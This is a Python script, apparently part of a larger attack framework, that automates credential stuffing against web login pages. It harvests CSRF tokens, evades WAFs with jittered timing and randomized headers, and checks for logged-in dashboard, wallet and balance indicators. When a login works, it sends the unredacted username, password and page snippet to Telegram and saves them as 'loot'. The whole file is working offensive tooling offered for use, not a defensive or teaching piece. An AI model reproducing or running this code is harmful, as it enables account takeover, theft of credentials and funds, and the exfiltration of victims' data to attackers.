#!/usr/bin/env python3
"""
FORM_STUFFER.PY v8.5 — Automated CSRF-Aware Credential Stuffing & Login Module (WAF Hardened)
Features:
- Dynamically scrapes live CSRF tokens (_token) from target login pages
- Maintains session state & cookie jars across GET/POST cycles with behavioral jitter & WAF evasion
- Submits valid or stuffed credentials against target login endpoints using randomized header hints
- Automatically routes successful authentication states to the centralized session loot reporter and Telegram
"""
import sys
import re
import httpx
import asyncio
from bs4 import BeautifulSoup
from urllib.parse import urlsplit

# Import centralized framework telemetry, immutable loot persistence, Telegram notifier, and behavioral mimicry
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous form stuffer functions."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

def execute_form_stuffing(target_url, username, password, login_path="/user/login"):
    apply_behavioral_jitter()
    
    parsed = urlsplit(target_url if "://" in target_url else f"https://{target_url}")
    base_url = f"{parsed.scheme}://{parsed.hostname}"
    if parsed.port:
        base_url += f":{parsed.port}"
    
    login_url = f"{base_url}{login_path}"
    log(f"\n[***] FORM STUFFER: Targeting login portal at {login_url} [***]", "\033[95m")

    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": login_url,
        "Cache-Control": "no-cache"
    }
    headers.update(get_randomized_hints())

    with httpx.Client(verify=False, follow_redirects=True, timeout=15.0) as client:
        try:
            # Step 1: GET the login page to harvest cookies and the dynamic CSRF token (_token)
            log("[*] Fetching login form and harvesting CSRF token...", "\033[94m")
            get_resp = client.get(login_url, headers=headers)
            
            if get_resp.status_code != 200:
                log(f"[-] Failed to load login page. Status: {get_resp.status_code}", "\033[91m")
                return False

            # Parse HTML to find hidden CSRF token
            soup = BeautifulSoup(get_resp.text, "html.parser")
            token_input = soup.find("input", {"name": "_token"})
            
            csrf_token = token_input.get("value") if token_input else None
            if not csrf_token:
                match = re.search(r'name="_token"\s+value="([^"]+)"', get_resp.text)
                if match:
                    csrf_token = match.group(1)

            if csrf_token:
                log(f"[+] Harvested active CSRF Token: {csrf_token[:15]}...", "\033[92m")
            else:
                log("[!] Warning: No CSRF token found. Proceeding with standard payload...", "\033[93m")

            # Step 2: Build payload with username, password, and CSRF token
            payload = {
                "username": username,
                "password": password
            }
            if csrf_token:
                payload["_token"] = csrf_token

            # Step 3: POST credentials to login action endpoint
            log(f"[*] Submitting credentials for user: {username}...", "\033[94m")
            apply_behavioral_jitter()
            post_resp = client.post(login_url, data=payload, headers=headers)
            
            status = post_resp.status_code
            body = post_resp.text
            body_lower = body.lower()

            # Step 4: Evaluate response for post-login indicators and filter SPA false positives
            is_login_page = (
                "login" in post_resp.url.path.lower() or 
                'type="password"' in body_lower or
                "invalid credentials" in body_lower or
                "incorrect username" in body_lower
            )
            
            is_spa_shell = (
                'div id="root"' in body_lower or 
                'div id="__next"' in body_lower or
                (len(body.strip()) < 200 and "dashboard" not in body_lower)
            )

            has_dashboard_indicators = any(k in body_lower for k in [
                "dashboard", "user_id", "balance", "total deposit", 
                "welcome back", "logout", "settings", "wallet", "deposit", "api_token"
            ])

            if status in (200, 302) and not is_login_page and not is_spa_shell and has_dashboard_indicators:
                log(f"[!!!] SUCCESS! Credential stuffing successful! Access confirmed [HTTP {status}] [!!!]", "\033[91m")
                
                loot_payload = {
                    "target": login_url,
                    "username": username,
                    "password": password,
                    "status": status,
                    "response_snippet": body[:400]
                }

                # BROADCAST UNREDACTED CREDENTIAL STUFFING LOOT STRAIGHT TO TELEGRAM
                broadcast_tg_alert_sync("Credential Stuffing Success", loot_payload)

                # STREAM TELEMETRY & PERSIST TO DISK VIA CENTRALIZED FRAMEWORK LOGGER
                stream_proof("FORM_STUFFER_SUCCESS", login_url, {"username": username}, body[:300], {"status": status})
                save_session_loot(
                    target=base_url,
                    endpoint=login_path,
                    finding_type="FORM_STUFFER_AUTHENTICATION_SUCCESS",
                    status=status,
                    headers=dict(post_resp.headers),
                    body=body,
                    extra_loot=loot_payload
                )
                return True
            else:
                log(f"[-] Login rejected or returned to login portal (Status: {status}).", "\033[93m")
                return False

        except Exception as exc:
            log(f"[-] Form stuffer execution error: {exc}", "\033[91m")
            return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 form_stuffer.py <target_url> <username> <password>")
        sys.exit(1)
    
    asyncio.run(asyncio.to_thread(execute_form_stuffing, sys.argv[1], sys.argv[2], sys.argv[3]))
